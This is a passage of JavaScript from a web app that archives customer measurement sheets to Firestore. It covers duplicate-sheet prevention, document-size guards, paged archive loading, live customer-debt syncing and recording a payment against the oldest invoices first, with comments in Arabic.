    // يكتب النسخة الحالية إلى Firestore بعد توقّف قصير عن الكتابة، بدل الكتابة عند كل حرف
    function scheduleArchiveSync(){
      if(_loadingArchive||sheetViewOnly||!currentArchiveDocId)return;
      const state=buildStateSnapshot();if(!checkSheetSize({state}))return;
      const patch={label:(state.custName||'بدون اسم')+' ('+formatWesternDate()+')',state,updatedAt:Date.now(),updatedBy:currentUserName()};
      patchArchiveLocal(currentArchiveDocId,patch);wsQueueArchiveWrite(currentArchiveDocId,patch,false);
    }
    window.WSArchiveContext=()=>({uid:currentUserUid(),db:typeof db!=='undefined'?db:null,track:p=>_wsTrack(p,'measurementJobs')});
    function wsQueueArchiveWrite(id,payload,create=false){
      try{window.WSArchiveOutbox.enqueue(currentUserUid(),id,payload,create);}
      catch(e){showMiniToast('حُفظت المسودة محلياً؛ تعذرت جدولة المزامنة: '+e.message,'#a65b00');}
    }
    function wsSaveBeforeExit(){
      if(_loadingArchive||_resumeChoiceOpen)return;
      try{const state=buildStateSnapshot();if(!hasAnyData(state))return;
        saveCurrentState();saveEmergencyLocalSnapshot();
        window.WSArchiveOutbox?.flush();
      }catch(e){console.warn('Exit snapshot',e);}
    }
    window.wsSaveBeforeExit=wsSaveBeforeExit;
    window.addEventListener('pagehide',wsSaveBeforeExit);
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')wsSaveBeforeExit();});


    function loadFromJSON(data) {
      clearPendingSheetChanges();
      if(!data) return;
      const wasLoading=_loadingArchive;_loadingArchive=true;try{
      // المبلغ المدفوع وحالة الاعتماد يُستعادان مع بقية الكراسة
      try {
        const pe = document.getElementById('sheetPaid');
        if (pe) { pe.value = data.sheetPaid || ''; }
        const sn = document.getElementById('sheetNotes');
        if (sn) sn.value = data.sheetNotes || '';
        setSheetApproval(data.sheetApproval || null);
        sheetTotalOverride = (typeof data.sheetTotalOverride === 'number') ? data.sheetTotalOverride : null;
      } catch (e) {}
      suppressedAutoBillTypes = new Set(Array.isArray(data.suppressedAutoBillTypes) ? data.suppressedAutoBillTypes.map(x => resolveTypeId(x) || x) : []);
      document.getElementById('custName').value = data.custName || '';
      document.getElementById('custPhone').value = data.custPhone || '';
      custLocation = data.custLocation || null;
      custPhotos = Array.isArray(data.custPhotos) ? data.custPhotos : [];
      renderProjectPhotos();
      jobList = data.jobList || [];
      document.getElementById('billArea').innerHTML = '';
      if(data.billData) data.billData.forEach(b => {
        // استعادة كمية البند يجب أن تتم بعد إنشاء الصف؛ addBillRow ينفذ calcBill()
        // وقد يعيد حساب الكمية قبل أن نضع علامة الكمية اليدوية، فيحوّلها إلى صفر.
        const row=addBillRow(b.n??'',b.p??'',b.q??'',b.at?resolveTypeId(b.at):'');
        if(row) {
          row.dataset.manualFixed='1';row.dataset.selectionRefs=JSON.stringify(Array.isArray(b.refs)?b.refs:[]);
          if(b.active&&!document.querySelector('.bill-row[data-selection-target="1"]')){row.dataset.selectionTarget='1';row.classList.add('ws-bill-active');}
          if(b.qtyFixed || !b.at) row.dataset.manualQtyFixed='1';
          const q = row.querySelector('.b-q');
          if(q && b.q !== undefined && b.q !== null) q.value = String(b.q);
        }
      });
      // احسب الإجماليات بعد تثبيت الكميات المستعادة، لا قبلها.
      calcBill();
      applyTypeAliases();   // كراسة قديمة قد تحمل معرّفات دُمجت لاحقاً
      // استعادة حقول المقاس/اللون/الملاحظات غير المضافة للجدول بعد (أو تفريغها إن كانت هذه الحالة القديمة لا تحوي مسودة محفوظة)
      document.querySelectorAll('#inputSection input').forEach(i => { i.value = (data.draft && data.draft[i.id] !== undefined) ? data.draft[i.id] : ''; });
      document.getElementById('note').value = (data.draft && data.draft.note !== undefined) ? data.draft.note : '';
      renderTable();
      updateShareHeader();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
      }finally{_loadingArchive=wasLoading;}
    }

    // ينشئ نسخة جديدة في أرشيف Firestore من الحالة الحالية، ويربط الجلسة الحالية بها لمزامنة أي تعديل لاحق تلقائياً
    /* ══ حارس حجم المستند ══
       حدّ مستند Firestore ميغابايت واحد. وتجاوزه لا يُنتج خطأً يراه
       المستخدم: الكتابة لا تنتظر السيرفر، فيرفضها هو بصمت ويظن المستخدم
       كراسته محفوظة — ولا يكتشف الحقيقة إلا حين يفتحها من جهاز آخر.

       نقيس قبل الإرسال. وإن اقترب الحجم من الحدّ نُحذّر بوضوح ونقترح
       المخرج العملي: حذف بعض الرسوم، أو تقسيم الكراسة على زبونين. */
    const FS_DOC_LIMIT = 1048576;          // ميغابايت
    const FS_DOC_WARN  = 800 * 1024;       // نحذّر قبل الوصول بمساحة كافية
    let _sizeWarnedAt = 0;

    function payloadSize(obj) {
      try { return new Blob([JSON.stringify(obj)]).size; }
      catch (e) { try { return JSON.stringify(obj).length; } catch (e2) { return 0; } }
    }

    /* يعيد true إن كان الحفظ آمناً. يُحذّر مرة كل دقيقتين على الأكثر حتى
       لا يتحوّل التنبيه إلى إزعاج مع كل حفظ تلقائي. */
    function checkSheetSize(payload) {
      const n = payloadSize(payload);
      if (n < FS_DOC_WARN) return true;

      const sketches = (payload.state && Array.isArray(payload.state.jobList))
        ? payload.state.jobList.filter(i => i && i.img).length : 0;
      const kb = Math.round(n / 1024);

      if (n >= FS_DOC_LIMIT) {
        alert('⛔ هذه الكراسة أكبر من أن تُحفظ (' + kb + ' كيلوبايت، والحدّ 1024).\n\n' +
              'السبب غالباً الرسوم المرفقة (' + sketches + ' رسماً).\n\n' +
              'المخرج: احذف رسوم بعض المقاسات، أو قسّم الكراسة على أكثر من واحدة.\n' +
              '⚠️ لن تُحفظ حتى يصغر حجمها.');
        return false;
      }

      if (Date.now() - _sizeWarnedAt > 120000) {
        _sizeWarnedAt = Date.now();
        showMiniToast('⚠️ حجم الكراسة ' + kb + ' KB — اقترب من الحدّ (1024). قلّل الرسوم.', '#157f4a');
      }
      return true;
    }

    /* ══ منع تكرار الكراسة ══
       createArchiveEntry تُستدعى من ثلاثة مسارات، وأحدها (saveCurrentState)
       يقع مع كل تغيّر في الحالة — أي مع كل حرف يُكتب. وشرطها الوحيد كان
       `!currentArchiveDocId`، وهو يُضبط داخل الدالة نفسها.

       لكن الضبط يقع **بعد** فحص الحجم: إن رجعت الدالة قبله (كراسة كبيرة)
       يبقى المعرّف فارغاً، فتُستدعى ثانيةً مع الحرف التالي وتُنشئ مستنداً
       جديداً — وهكذا مع كل حرف. فتظهر عشرات الكراسات بنفس الاسم.

       القفل هنا يمنع أي استدعاء ثانٍ ما دام الأول لم يُكمل. */
    let _creatingArchive = false;

    // _loadingArchive مُعرّف قرب currentArchiveDocId لضمان وجوده قبل أي حفظ.

    function getArchiveCreationOperationId() {
      // المفتاح يبقى ثابتاً لهذه الكراسة عبر إعادة التحميل والتبويبات؛
      // لذلك تؤدي محاولات الإنشاء المتزامنة إلى مستند Firestore واحد لا عدة مستندات.
      const key = 'ws_measurement_creation_operation_id';
      try {
        let id = safeGetItem(key);
        if (id && /^mjob_[a-z0-9_-]{12,80}$/i.test(id)) return id;
        const random = (window.crypto && typeof window.crypto.randomUUID === 'function')
          ? window.crypto.randomUUID().replace(/-/g, '')
          : (Date.now().toString(36) + Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
        id = 'mjob_' + random.toLowerCase();
        safeSetItem(key, id);
        return id;
      } catch (_) {
        return 'mjob_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 18);
      }
    }
    function rotateArchiveCreationOperationId() {
      // لا ندوّر المفتاح إلا عند فعل صريح يبدأ كراسة جديدة، لا لمجرد إعادة فتح الصفحة.
      try {
        const random = (window.crypto && typeof window.crypto.randomUUID === 'function')
          ? window.crypto.randomUUID().replace(/-/g, '')
          : (Date.now().toString(36) + Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
        safeSetItem('ws_measurement_creation_operation_id', 'mjob_' + random.toLowerCase());
      } catch (_) {}
    }
    function createArchiveEntry() {
      // لا إنشاء أثناء تحميل كراسة قائمة — وإلا نُسخت نسخةً ثانية منها
      if (_loadingArchive || _creatingArchive || currentArchiveDocId) return;
      // v311: منع التكرار الحرفي فقط عند تطابق اسم الزبون والمقاسات نفسها.
      // لا نطابق الاسم وحده، ولا نلمس الكراسات المعتمدة أو الكراسات بلا مقاسات.
      try {
        const candidate = buildStateSnapshot();
        const normalizeCustomer = v => String(v || '').trim().replace(/\\s+/g, ' ').toLocaleLowerCase();
        const normalizeMeasure = v => String(v == null ? '' : v).trim();
        const exactMeasureKey = st => {
          const rows = Array.isArray(st && st.jobList) ? st.jobList : [];
          if (!rows.length) return '';
          return rows.map(r => [
            normalizeMeasure(r.type), normalizeMeasure(r.w), normalizeMeasure(r.h),
            normalizeMeasure(r.res), normalizeMeasure(r.sk), normalizeMeasure(r.itemColor),
            normalizeMeasure(r.note)
          ].join('¦')).sort().join('§');
        };
        const customerKey = normalizeCustomer(candidate.custName);
        const measureKey = exactMeasureKey(candidate);
        const exactBillKey = st => {
          const rows = Array.isArray(st && st.billData) ? st.billData : [];
          return rows.map(r => [
            normalizeMeasure(r.n), normalizeMeasure(r.q), normalizeMeasure(r.p)
          ].join('¦')).sort().join('§');
        };
        if (customerKey && measureKey) {
          /* V316: لا نستثنِ الكراسة المعتمدة من كشف التكرار.
             كانت الكراسة المعتمدة تُستبعد، فيمكن إنشاء نسخة ثانية للاسم
             والمقاسات والبنود نفسها بعد ضياع رابط المستند الحالي.
             نقيّد المطابقة بالسجلات المعدّلة خلال آخر 24 ساعة حتى لا نمنع
             عملاً جديداً مشروعاً للزبون نفسه بعد مرور يوم أو أكثر. */
          const _dedupNow = Date.now();
          const _dedupWindowMs = 24 * 60 * 60 * 1000;
          const twins = (archives || []).filter(a => {
            if (!a || a.deleted || a.id === currentArchiveDocId) return false;
            if (normalizeCustomer(a.data && a.data.custName) !== customerKey) return false;
            if (exactMeasureKey(a.data) !== measureKey) return false;
            const _stamp = Number(a.updatedAt || a.createdAt || a.timestamp || 0);
            // السجلات القديمة التي لا تحمل توقيتاً لا تُربط تلقائياً حفاظاً على الأعمال السابقة.
            return _stamp > 0 && Math.abs(_dedupNow - _stamp) <= _dedupWindowMs;
          });
          // لا نربط الكراسة الحالية بسجل آخر إذا كانت بنوده المالية مختلفة؛
          // ذلك قد يمحو تعديلات مالية صحيحة أو يخلط حسابين متشابهين.
          const twin = twins.find(a => exactBillKey(a.data) === exactBillKey(candidate));
          if (twin) {
            setCurrentArchiveDoc(twin.id);
            currentArchiveIndex = (archives || []).findIndex(a => a.id === twin.id);
            safeSetItem('ws_current_archive_id', twin.id);
            showMiniToast('تم منع إنشاء كراسة مكررة: الاسم والمقاسات والبنود المالية متطابقة. افتح الكراسة الموجودة لتعديلها.', '#a65b00');
            try { renderArchiveList(); } catch (_) {}
            return;
          }
          if (twins.length) {
            showMiniToast('تنبيه: الاسم والمقاسات موجودان، لكن البنود المالية مختلفة؛ لم نربط الكراسة بالسجل الآخر حفاظاً على الحسابات.', '#a65b00');
          }
        }
      } catch (dedupError) {
        console.warn('تعذر إكمال فحص التكرار الصارم؛ لم تُحذف أي بيانات:', dedupError);
      }
      _creatingArchive = true;
      try { return _createArchiveEntryInner(); }
      finally { _creatingArchive = false; }
    }

    /* بصمة محتوى الكراسة: اسم الزبون + هاتفه + كل سطر مقاس.
       تُحسب من **الحالة المخزَّنة** لا من الشاشة، ليمكن مقارنتها بسجلات
       الأرشيف القائمة على قدم المساواة. */
    function stateFingerprint(st) {
      try {
        if (!st) return '';
        const jobs = (st.jobList || [])
          .map(i => [i.type, i.w, i.h, i.res, i.sk || '', i.itemColor || ''].join('|'))
          .join(';');
        const bills = (st.billData || []).map(b => [b.n, b.q, b.p].join('|')).join(';');
        return [String(st.custName || '').trim(), String(st.custPhone || '').trim(), jobs, bills].join('#');
      } catch (e) { return ''; }
    }

    /* ⚠️⚠️ إصلاح 9.0.1 — تكرار الكراسة في الأرشيف.

       سبب التكرار ليس واحداً، وهذا ما جعل معالجته بحارسٍ واحد تفشل:

         • الرابط بين الكراسة ومستندها محفوظ في ws_current_archive_id.
           فإن تعذّرت الكتابة في التخزين المحلي (امتلاء، تصفّح خفي)، أو
           فُتحت الصفحة في تبويب ثانٍ، أو حُدِّث النظام — يضيع الرابط.
         • وأول تعديل بعد ضياعه يجد currentArchiveDocId فارغاً، فيُنشئ
           **مستنداً جديداً لنفس الكراسة**. ثم يتكرّر مع كل ضياع.

       والحارس القائم (`|| currentArchiveDocId`) لا يرى شيئاً من ذلك:
       فهو يسأل «هل أنا مرتبط؟» ولا يسأل «هل هذه الكراسة موجودة أصلاً؟».

       الآن يُسأل السؤال الثاني: قبل إنشاء أي مستند، نبحث في الأرشيف عن
       كراسة **بنفس البصمة** حُدِّثت خلال ٢٤ ساعة. فإن وُجدت، نتبنّى
       مستندها بدل إنشاء نظير له — فيعود التعديل إلى مكانه الصحيح ويشفى
       الرابط الضائع من تلقاء نفسه.

       والمدّة مقصودة: كراسة بنفس الزبون ونفس المقاسات بعد يوم أو أكثر
       هي على الأرجح عمل جديد مشروع، لا تكراراً. */
    // محفوظ للتوافق مع سجلات الإصدارات القديمة فقط؛ لا يُستدعى عند إنشاء كراسة جديدة.
    function findExistingSheet(state) {
      const fp = stateFingerprint(state);
      if (!fp || fp.split('#').slice(2).join('') === '') return null;   // بلا مقاسات: لا مقارنة
      /* ⚠️ 9.7.0 — النافذة من يوم إلى نصف ساعة.

         الغرض الأصلي كان التقاط **الجلسة نفسها** حين يضيع رابطها (إعادة
         تحميل، تبويب ثانٍ، تحديث النظام). وذلك يقع خلال دقائق لا خلال
         يوم. واليومُ كان يلتقط معه أعمالاً مستقلة تماماً.

         ونستثني المعتمدة: كراسة اعتُمدت صار عليها فاتورة، والإكمال عليها
         يفسد الربط بينهما. */
      const WIN = 30 * 60 * 1000, now = Date.now();
      return (archives || []).find(a =>
        !a.deleted && !a.approved &&
        (now - (a.updatedAt || 0)) < WIN &&
        stateFingerprint(a.data) === fp
      ) || null;
    }

    function _createArchiveEntryInner() {
      let name = document.getElementById('custName').value || 'بدون اسم';
      let state = buildStateSnapshot();

      /* 9.9.21 — لا توجد مطابقة تلقائية بالاسم أو بالمقاسات.
         نفس اسم العميل لا يعني نفس الطلب. الكراسة الجديدة يجب أن تكون
         مستقلة دائماً، حتى لو كانت هناك كراسة قديمة بالاسم نفسه.
         الكتابة فوق القديمة لا تحدث إلا إذا فتحها المستخدم من الأرشيف
         وضغط «تعديل وإضافة مقاسات»، وعندها يكون currentArchiveDocId
         مربوطاً بها مسبقاً. */

      // معرف حتمي للعملية الحالية: يحمي محلياً وعند الكتابة إلى Firestore من
      // إنشاء مستندين إذا تكرر الحفظ من تبويبين أو قبل اكتمال المزامنة.
      let newId = getArchiveCreationOperationId();
      setCurrentArchiveDoc(newId);
      currentArchiveIndex = 0; // العنصر الجديد يظهر أولاً في القائمة بمجرد وصول التحديث من المستمع الحي
      const payload = {
        label: name + " (" + formatWesternDate() + ")",
        state: state,
        createdAt: Date.now(),
        createdByUid: (window.currentShopUser && window.currentShopUser.uid) || '',
        updatedAt: Date.now(),
        updatedBy: (window.currentShopUser && window.currentShopUser.name) || '',
        creationOperationId: newId
      };
      if (!checkSheetSize(payload)) { setCurrentArchiveDoc(null); return; }
      // تحديث القائمة المحلية فوراً: لا ننتظر صفحة Firestore التالية.
      upsertArchiveLocal(newId, payload);
      wsQueueArchiveWrite(newId,payload,true);
    }

    // v223 — الأرشيف التدريجي: لا نحمل كل measurementJobs دفعة واحدة.
    let archivesUnsub = null;
    let measurementArchiveCursor = null;
    let measurementArchiveHasMore = true;
    let measurementArchiveLoading = false;
    let measurementArchiveSearchSeq = 0;
    let measurementArchiveSearchTimer = null;
    const MEASUREMENT_ARCHIVE_PAGE_SIZE = 100;
    const MEASUREMENT_ARCHIVE_SEARCH_PAGE_SIZE = 100;

    function measurementArchiveMapDoc(d) {
      const v = d.data || {};
      return {
        id: d.id, name: v.label || 'بدون اسم', data: v.state || {},
        updatedAt: v.updatedAt || v.createdAt || v.approvedAt || 0,
        deleted: v.deleted === true, deletedAt: v.deletedAt || 0,
        deletedBy: v.deletedBy || '', updatedBy: v.updatedBy || '',
        approved: v.approved === true, approvedInvId: v.approvedInvId || '',
        approvedTotal: v.approvedTotal || 0, approvedPaid: v.approvedPaid || 0,
        approvedAt: v.approvedAt || 0, workStarted: v.workStarted === true,
        workStartedAt: v.workStartedAt || 0, workDone: v.workDone === true,
        workDoneAt: v.workDoneAt || 0, workDoneBy: v.workDoneBy || '',
        workStartedBy: v.workStartedBy || ''
      };
    }

    function mergeMeasurementArchiveSearchDocs(rows) {
      const byId = new Map((archives || []).map(a => [a.id, a]));
      (rows || []).forEach(a => { if (a && !a.deleted && a.id && !byId.has(a.id)) { byId.set(a.id, a); archives.push(a); } });
    }

    async function searchMeasurementArchiveServer(term) {
      const q = String(term || '').trim();
      const seq = ++measurementArchiveSearchSeq;
      if (measurementArchiveSearchTimer) clearTimeout(measurementArchiveSearchTimer);
      if (q.length < 2 || typeof FirestorePager?.fetchPrefix !== 'function') {
        loadArchiveUI(q);
        return;
      }
      measurementArchiveSearchTimer = setTimeout(async () => {
        try {
          const [byName, byPhone, byLabel] = await Promise.all([
            FirestorePager.fetchPrefix(db, 'measurementJobs', 'state.custName', q, { pageSize: MEASUREMENT_ARCHIVE_SEARCH_PAGE_SIZE }),
            FirestorePager.fetchPrefixVariants(db, 'measurementJobs', 'state.custPhone', q, { pageSize: MEASUREMENT_ARCHIVE_SEARCH_PAGE_SIZE }),
            FirestorePager.fetchPrefix(db, 'measurementJobs', 'label', q, { pageSize: MEASUREMENT_ARCHIVE_SEARCH_PAGE_SIZE })
          ]);
          if (seq !== measurementArchiveSearchSeq) return;
          const docs = [...byName.docs, ...byPhone.docs, ...byLabel.docs];
          mergeMeasurementArchiveSearchDocs(docs.map(measurementArchiveMapDoc));
        } catch (e) {
          if (seq === measurementArchiveSearchSeq) console.warn('البحث الموجّه في أرشيف القياسات:', e && e.code || e);
        }
        if (seq === measurementArchiveSearchSeq) loadArchiveUI(q, true);
      }, 220);
    }

    let measurementArchiveLastError = '';
    function hydrateLocalMeasurementArchive() {
      if (archives.length || !storageAvailable) return 0;
      try {
        const local = wsParse(safeGetItem('ws_archives'), []);
        if (!Array.isArray(local) || !local.length) return 0;
        const rows = local.map((a, i) => ({
          id: String(a.id || ('LOCAL-' + i + '-' + String(a.savedAt || a.date || ''))),
          name: a.name || (a.data && a.data.custName) || 'بدون اسم',
          data: a.data || {},
          updatedAt: Number(a.updatedAt || a.savedAt || a.timestamp || 0),
          deleted: a.deleted === true, deletedAt: Number(a.deletedAt || 0),
          deletedBy: a.deletedBy || '', updatedBy: a.updatedBy || '',
          approved: a.approved === true, approvedInvId: a.approvedInvId || '',
          approvedTotal: a.approvedTotal || 0, approvedPaid: a.approvedPaid || 0,
          approvedAt: a.approvedAt || 0, workStarted: a.workStarted === true,
          workStartedAt: a.workStartedAt || 0, workDone: a.workDone === true,
          workDoneAt: a.workDoneAt || 0, workDoneBy: a.workDoneBy || '', workStartedBy: a.workStartedBy || ''
        }));
        archives = rows.filter(a => !a.deleted);
        for(const item of window.WSArchiveOutbox?.pending(currentUserUid())||[]){const remote=rows.find(r=>r.id===item.id);if(remote?.deleted)continue;const local={id:item.id,name:item.payload.label,data:item.payload.state,updatedAt:item.payload.updatedAt,pendingSync:true};const index=archives.findIndex(r=>r.id===item.id);if(index<0)archives.unshift(local);else if(Number(archives[index].updatedAt)<=Number(local.updatedAt))archives[index]=local;}
        archivesTrash = rows.filter(a => a.deleted).sort((a,b) => (b.deletedAt||0)-(a.deletedAt||0));
        return archives.length;
      } catch (e) { console.warn('تعذر عرض الأرشيف المحلي:', e); return 0; }
    }

    function renderMeasurementArchivePager() {
      const cont = document.getElementById('archiveList');
      if (!cont) return;
      let box = document.getElementById('measurement-archive-pager');
      if (!box) {
        box = document.createElement('div');
        box.id = 'measurement-archive-pager';
        box.style.cssText = 'text-align:center;padding:12px 4px;';
        cont.parentNode.insertBefore(box, cont.nextSibling);
      }
      if (measurementArchiveLoading) {
        box.innerHTML = '<div style="color:var(--muted);font-size:12px;font-weight:700;">⏳ جاري الاتصال بالأرشيف...</div>';
      } else if (measurementArchiveLastError) {
        box.innerHTML = '<div style="color:#a15c00;font-size:12px;font-weight:700;margin-bottom:7px;">⚠️ تعذّر تحديث الأرشيف الآن</div><button type="button" onclick="retryMeasurementArchive()" style="width:100%;padding:11px;border:1px solid #f0d39a;border-radius:12px;background:#fff9ed;color:#8a5200;font-family:inherit;font-weight:800;cursor:pointer;">🔄 إعادة المحاولة</button>';
      } else if (measurementArchiveHasMore) {
        box.innerHTML = '<button type="button" onclick="loadMoreMeasurementArchive()" style="width:100%;padding:11px;border:1px solid #cfe8dc;border-radius:12px;background:#f5fff9;color:#157f4a;font-family:inherit;font-weight:800;cursor:pointer;">⬇️ تحميل المزيد من الكراسات</button>';
      } else {
        box.innerHTML = archives.length ? '<div style="color:var(--muted);font-size:11px;">تم تحميل كل الكراسات المتاحة</div>' : '';
      }
    }

    function archivePageWithTimeout(ms) {
      return new Promise((resolve, reject) => {
        let settled = false;
        const timer = setTimeout(() => { if (!settled) { settled = true; reject(Object.assign(new Error('انتهت مهلة قراءة الأرشيف'), { code: 'deadline-exceeded' })); } }, ms);
        Promise.resolve().then(() => FirestorePager.fetchPage(db, 'measurementJobs', { pageSize: MEASUREMENT_ARCHIVE_PAGE_SIZE, cursor: measurementArchiveCursor }))
          .then(v => { if (settled) return; settled = true; clearTimeout(timer); resolve(v); })
          .catch(e => { if (settled) return; settled = true; clearTimeout(timer); reject(e); });
      });
    }

    async function loadMoreMeasurementArchive(reset) {
      if (measurementArchiveLoading) return;
      if (reset) {
        measurementArchiveCursor = null;
        measurementArchiveHasMore = true;
        measurementArchiveLastError = '';
        archives = [];
        archivesTrash = [];
        hydrateLocalMeasurementArchive();
        const searchBox = document.getElementById('archiveSearch');
        loadArchiveUI(searchBox ? searchBox.value : '', true);
        renderTrashUI();
      }
      if (!measurementArchiveHasMore) return;
      measurementArchiveLoading = true;
      renderMeasurementArchivePager();
      try {
        const page = await archivePageWithTimeout(12000);
        const all = page.docs.map(measurementArchiveMapDoc);
        const known = new Set(archives.map(a => a.id));
        archives.push(...all.filter(a => !a.deleted && !known.has(a.id)));
        const knownTrash = new Set(archivesTrash.map(a => a.id));
        archivesTrash.push(...all.filter(a => a.deleted && !knownTrash.has(a.id)).sort((a,b) => (b.deletedAt||0)-(a.deletedAt||0)));
        measurementArchiveCursor = page.lastDoc;
        measurementArchiveHasMore = page.hasMore;
        measurementArchiveLastError = '';
        const searchBox = document.getElementById('archiveSearch');
        loadArchiveUI(searchBox ? searchBox.value : '', true);
        renderTrashUI();
      } catch (err) {
        measurementArchiveLastError = (err && err.code) || 'archive-read-failed';
        console.error('تعذّرت قراءة صفحة أرشيف القياسات:', err);
        if (!archives.length) hydrateLocalMeasurementArchive();
        const searchBox = document.getElementById('archiveSearch');
        loadArchiveUI(searchBox ? searchBox.value : '', true);
        renderTrashUI();
        showFsErrorToast(fsErrorMessage(err, 'أرشيف القياسات'));
      } finally {
        measurementArchiveLoading = false;
        renderMeasurementArchivePager();
      }
    }

    function retryMeasurementArchive() {
      measurementArchiveLastError = '';
      loadMoreMeasurementArchive(true);
    }
    window.retryMeasurementArchive = retryMeasurementArchive;

    function attachMeasurementJobsSync() {
      if (archivesUnsub) return;
      archivesUnsub = { paged: true };
      loadMoreMeasurementArchive(true);
    }

    // لود الأرشيف مع دعم السحب
/* ══════════════════════════════════════════════════════════
       دين العميل — قراءة حيّة من الفواتير
       ------------------------------------------------------------
       الدين محسوب في تطبيق الفواتير، ولا يُعاد حسابه هنا: نقرأ netDebt
       المخزَّن على كل فاتورة ونجمعه باسم العميل.

       ولماذا لا نحسبه بأنفسنا؟ لأن حسابه هناك يمرّ بطبقة اشتقاق تراعي
       المقبوضات والمرتجعات والأرصدة الدائنة. وحساب موازٍ هنا يعني رقمين
       لنفس الدين قد يفترقان — والزبون يُطالَب بأحدهما.
       ══════════════════════════════════════════════════════════ */
    let custDebts = {};        // اسم العميل → { debt, credit, payments }
    let customerPaymentTotals = {}; // إجمالي الواصلات حسب اسم الزبون للعرض فقط
    let debtsUnsub = null;

    function attachDebtsSync() {
      if (debtsUnsub) return;
      debtsUnsub = db.collection('sales').onSnapshot(snap => {
        const map = {};
        snap.forEach(d => {
          const v = d.data() || {};
          const n = (v.customerName || '').trim();
          if (!n) return;
          if (!map[n]) map[n] = { debt: 0, credit: 0, payments: customerPaymentTotals[n] || 0 };
          map[n].debt = money2(map[n].debt + (Number(v.netDebt) || 0));
        });
        custDebts = map;
        try { loadArchiveUI(); } catch (e) {}
      }, err => console.warn('مزامنة الديون:', err && err.code));

      // الأرصدة الدائنة مجموعة مستقلة
      db.collection('creditBalances').onSnapshot(snap => {
        snap.forEach(d => {
          const n = decodeURIComponent(d.id);
          if (!custDebts[n]) custDebts[n] = { debt: 0, credit: 0 };
          custDebts[n].credit = money2((d.data() || {}).amount || 0);
        });
        try { loadArchiveUI(); } catch (e) {}
      }, err => console.warn('مزامنة الأرصدة:', err && err.code));

      // سجل الواصلات مصدر مستقل؛ نعرض مجموع الدفعات دون طرحه ثانيةً من الدين،
      // لأن netDebt يكون قد خُفّض عند تسجيل الدفعة.
      db.collection('payments').onSnapshot(snap => {
        const totals = {};
        snap.forEach(doc => {
          const p = doc.data() || {};
          const n = String(p.customerName || '').trim();
          if (!n) return;
          totals[n] = money2((totals[n] || 0) + (Number(p.amount) || 0));
        });
        customerPaymentTotals = totals;
        Object.keys(custDebts).forEach(n => { custDebts[n].payments = totals[n] || 0; });
        Object.keys(totals).forEach(n => {
          if (!custDebts[n]) custDebts[n] = { debt: 0, credit: 0, payments: totals[n] };
          else custDebts[n].payments = totals[n];
        });
        try { loadArchiveUI(); } catch (e) {}
      }, err => console.warn('مزامنة دفعات الزبائن:', err && err.code));
    }

    // سطر الحالة المالية بخط صغير تحت اسم الزبون في الأرشيف
    function debtLineFor(name) {
      const n = (name || '').trim();
      if (!n) return '';
      const d = custDebts[n];
      if (!d) return '';
      const paid = Number(d.payments) || 0;
      const paymentLine = paid > 0.011
        ? '<div class="arch-payment-total" style="font-size:10px;color:#64748b;margin-top:2px;">الدفعات المسجلة: ' + paid.toFixed(2) + ' د.ل</div>' : '';
      if (d.debt > 0.011) {
        return '<div class="arch-debt owes">المتبقي: ' + d.debt.toFixed(2) + ' د.ل' +
               '<button class="pay-btn" title="تسجيل دفعة" ' +
               'onclick="event.stopPropagation(); addPaymentForCustomer(\'' + escAttr(n) + '\');">' +
               '+ دفعة</button></div>' + paymentLine;
      }
      if (d.credit > 0.011) {
        return paymentLine + '<div class="arch-debt has-credit">له رصيد: ' + d.credit.toFixed(2) + ' د.ل</div>';
      }
      return paymentLine + '<div class="arch-debt clear">✔ لا دين عليه</div>';
    }

/* ══ تسجيل دفعة أخرى من الكراسة ══
       الزبون يدفع دفعة ثانية وهو أمام الفنّي في الموقع — والفنّي لا
       يفتح تطبيق الفواتير ولا صلاحية له فيه غالباً. فبلا هذا الباب
       تُكتب الدفعة في ورقة أو تُنسى، ويبقى الدين على حاله في النظام.

       التوزيع هنا **نفسه** الذي يفعله تطبيق الفواتير: الأقدم فالأحدث،
       مع سجل توزيع كامل يسمح بعكس الدفعة إن حُذفت لاحقاً. أي اختلاف
       يعني دفعة لا تستطيع أدوات الفواتير التعامل معها. */
    async function addPaymentForCustomer(name) {
      const who = (name || '').trim();
      if (!who) { alert('لا اسم زبون في هذه الكراسة.'); return; }

      const d = custDebts[who] || { debt: 0, credit: 0 };
      if (d.debt <= 0.011) {
        alert('لا دين على «' + who + '».' +
              (d.credit > 0.011 ? ('\n\nله رصيد دائن: ' + d.credit.toFixed(2) + ' د.ل') : ''));
        return;
      }

      if (!navigator.onLine) {
        alert('🔴 تسجيل الدفعة يحتاج اتصالاً بالإنترنت.\n\n' +
              'التوزيع على الفواتير يعتمد على قراءتها من السيرفر — ودون اتصال ' +
              'قد تكون قديمة فتُوزَّع الدفعة على فواتير سُدِّدت أصلاً.');
        return;
      }

      const ans = prompt('دفعة من «' + who + '»\n\nالدين الحالي: ' + d.debt.toFixed(2) + ' د.ل\n\nالمبلغ المدفوع:', '');
      if (ans === null) return;
      const amount = money2(toLatinNums(String(ans).trim()));
      if (isNaN(amount) || amount <= 0) { alert('⚠️ اكتب مبلغاً صحيحاً أكبر من صفر.'); return; }

      const uid = (window.currentShopUser && window.currentShopUser.uid) || '';
      if (!uid) { alert('⚠️ لم يكتمل التحقق من حسابك — أعد المحاولة.'); return; }

      // نقرأ فواتيره من السيرفر لا من الذاكرة: التوزيع يجب أن يقع على الحالة الحقيقية
      let sales = [];
      try {
        const q = await db.collection('sales').where('customerName', '==', who).get();
        q.forEach(doc => sales.push(Object.assign({ id: doc.id }, doc.data())));
      } catch (e) {
        alert('⚠️ تعذّر قراءة فواتير العميل: ' + (e && e.message ? e.message : e));
        return;
      }

      // الأقدم فالأحدث — نفس ترتيب تطبيق الفواتير
      sales.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));

      let rem = amount;
      const dist = [];
      const touched = [];
      for (const inv of sales) {
        const nd = money2(inv.netDebt || 0);
        if (nd <= 0) continue;
        const applied = money2(Math.min(rem, nd));
        if (applied <= 0) break;
        inv._newPaid = money2((inv.paid || 0) + applied);
        inv._newDebt = money2(nd - applied);
        dist.push({ saleId: inv.id, amountApplied: applied });
        touched.push(inv);
        rem = money2(rem - applied);
        if (rem <= 0) break;
      }
      const creditAdded = rem > 0.011 ? rem : 0;

      const msg = 'تأكيد الدفعة\n\n' +
